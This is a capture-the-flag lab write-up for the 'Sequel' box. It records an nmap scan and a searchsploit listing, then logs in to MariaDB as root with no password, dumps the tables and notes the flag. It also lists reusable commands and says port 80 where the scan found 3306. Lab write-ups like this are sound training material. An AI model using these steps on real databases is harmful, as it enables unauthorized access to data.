# Target: Sequel

- IP Address: 10.129.106.112
- Starting Domain Name: target.htb

## Scope & Goal
- Objective: root flag
- Constraints: lab

# Recon
- Quick TCP:

```bash
$ nmap target.htb                     
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-11 14:12 -0500
Nmap scan report for target.htb (10.129.106.112)
Host is up (0.059s latency).
Not shown: 999 closed tcp ports (reset)
PORT     STATE SERVICE
3306/tcp open  mysql

Nmap done: 1 IP address (1 host up) scanned in 2.23 seconds
```

- Targeted Scan:

```bash
$ nmap target.htb -sV -sC -A -p3306 -Pn -n -vv
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-11 14:15 -0500
NSE: Loaded 158 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 14:15
Completed NSE at 14:15, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 14:15
Completed NSE at 14:15, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 14:15
Completed NSE at 14:15, 0.00s elapsed
Initiating SYN Stealth Scan at 14:15
Scanning target.htb (10.129.106.112) [1 port]
Discovered open port 3306/tcp on 10.129.106.112
Completed SYN Stealth Scan at 14:15, 0.32s elapsed (1 total ports)
Initiating Service scan at 14:15
Scanning 1 service on target.htb (10.129.106.112)
Completed Service scan at 14:18, 164.38s elapsed (1 service on 1 host)
Initiating OS detection (try #1) against target.htb (10.129.106.112)
Initiating Traceroute at 14:18
Completed Traceroute at 14:18, 0.13s elapsed
NSE: Script scanning 10.129.106.112.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 14:18
Completed NSE at 14:18, 21.69s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 14:18
Completed NSE at 14:18, 21.77s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 14:18
Completed NSE at 14:18, 0.00s elapsed
Nmap scan report for target.htb (10.129.106.112)
Host is up, received user-set (0.091s latency).
Scanned at 2026-04-11 14:15:24 CDT for 210s

PORT     STATE SERVICE REASON         VERSION
3306/tcp open  mysql?  syn-ack ttl 63
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.3.27-MariaDB-0+deb10u1
|   Thread ID: 65
|   Capabilities flags: 63486
|   Some Capabilities: ConnectWithDatabase, IgnoreSpaceBeforeParenthesis, SupportsLoadDataLocal, FoundRows, LongColumnFlag, SupportsCompression, SupportsTransactions, Speaks41ProtocolOld, ODBCClient, IgnoreSigpipes, InteractiveClient, DontAllowDatabaseTableColumn, Support41Auth, Speaks41ProtocolNew, SupportsMultipleResults, SupportsAuthPlugins, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: Q/4YB}sHM*()6qZP_l%m
|_  Auth Plugin Name: mysql_native_password
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
TCP/IP fingerprint:
OS:SCAN(V=7.98%E=4%D=4/11%OT=3306%CT=%CU=32967%PV=Y%DS=2%DC=T%G=N%TM=69DA9E
OS:9E%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)OP
OS:S(O1=M552ST11NW7%O2=M552ST11NW7%O3=M552NNT11NW7%O4=M552ST11NW7%O5=M552ST
OS:11NW7%O6=M552ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)EC
OS:N(R=Y%DF=Y%T=40%W=FAF0%O=M552NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
OS:D=S)

Uptime guess: 35.982 days (since Fri Mar  6 13:44:35 2026)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=259 (Good luck!)
IP ID Sequence Generation: All zeros

TRACEROUTE (using port 3306/tcp)
HOP RTT       ADDRESS
1   109.00 ms 10.10.14.1
2   109.06 ms 10.129.106.112

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 14:18
Completed NSE at 14:18, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 14:18
Completed NSE at 14:18, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 14:18
Completed NSE at 14:18, 0.00s elapsed
Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 210.81 seconds
           Raw packets sent: 33 (2.262KB) | Rcvd: 26 (1.814KB)
```

- Full TCP:

```bash
$ nmap target.htb -sC -sV -A -T4 -vv -p-
...
Same as Targeted Scan above
```

## Open Services
- 80/mariadb

## MariaDB Enum
- Tech: MariaDB 5.5.5
- Searchsploit:

```bash
$ searchsploit mariadb 5.5              
-------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                      |  Path
-------------------------------------------------------------------------------------------------------------------- ---------------------------------
MySQL / MariaDB / PerconaDB 5.5.51/5.6.32/5.7.14 - Code Execution / Privilege Escalation                            | linux/local/40360.py
MySQL / MariaDB / PerconaDB 5.5.x/5.6.x/5.7.x - 'mysql' System User Privilege Escalation / Race Condition           | linux/local/40678.c
MySQL / MariaDB / PerconaDB 5.5.x/5.6.x/5.7.x - 'root' System User Privilege Escalation                             | linux/local/40679.sh
-------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

I tried to get a few of the scripts going but I didn't have a lot of luck. I decided to pivot and try a basic user enumeration.

- User Enumeration:

```bash
$ mysql -h target.htb
ERROR 2026 (HY000): TLS/SSL error: SSL is required, but the server does not support it
                                                                                                                                                                                                                                            
┌──(kwmd㉿attack-box)-[~/Desktop]
└─$ mariadb -h target.htb --skip_ssl
ERROR 1045 (28000): Access denied for user 'kwmd'@'attack-box' (using password: NO)
                                                                                                                                                                                                                                            
┌──(kwmd㉿attack-box)-[~/Desktop]
└─$ mariadb -h target.htb --skip_ssl -u root
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 119
Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| htb                |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
4 rows in set (0.083 sec)

MariaDB [(none)]> use htb;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [htb]> show tables;
+---------------+
| Tables_in_htb |
+---------------+
| config        |
| users         |
+---------------+
2 rows in set (0.106 sec)

MariaDB [htb]> select * from config;
+----+-----------------------+----------------------------------+
| id | name                  | value                            |
+----+-----------------------+----------------------------------+
|  1 | timeout               | 60s                              |
|  2 | security              | default                          |
|  3 | auto_logon            | false                            |
|  4 | max_size              | 2M                               |
|  5 | flag                  | 7b4bec00d1a39e3dd4e021ec3d915da8 |
|  6 | enable_uploads        | false                            |
|  7 | authentication_method | radius                           |
+----+-----------------------+----------------------------------+
7 rows in set (0.058 sec)

MariaDB [htb]> select * from users;
+----+----------+------------------+
| id | username | email            |
+----+----------+------------------+
|  1 | admin    | admin@sequel.htb |
|  2 | lara     | lara@sequel.htb  |
|  3 | sam      | sam@sequel.htb   |
|  4 | mary     | mary@sequel.htb  |
+----+----------+------------------+
4 rows in set (0.166 sec)
```

## Flags
- root flag: `7b4bec00d1a39e3dd4e021ec3d915da8` (Sat Apr 11 07:41:37 PM UTC 2026)

## Lessons
- What Worked: Trying to connect to MariaDB with typical credentials
- Dead Ends: Trying to look for exploits with `searchsploit`
- Reusable Commands:

```bash
mariadb -h target.htb

mariadb -h target.htb --skip_ssl

mariadb -h target.htb --skip_ssl -u root

SHOW DATABASES;

use <database>;

SHOW TABLES;

SELECT * FROM <table>;
```
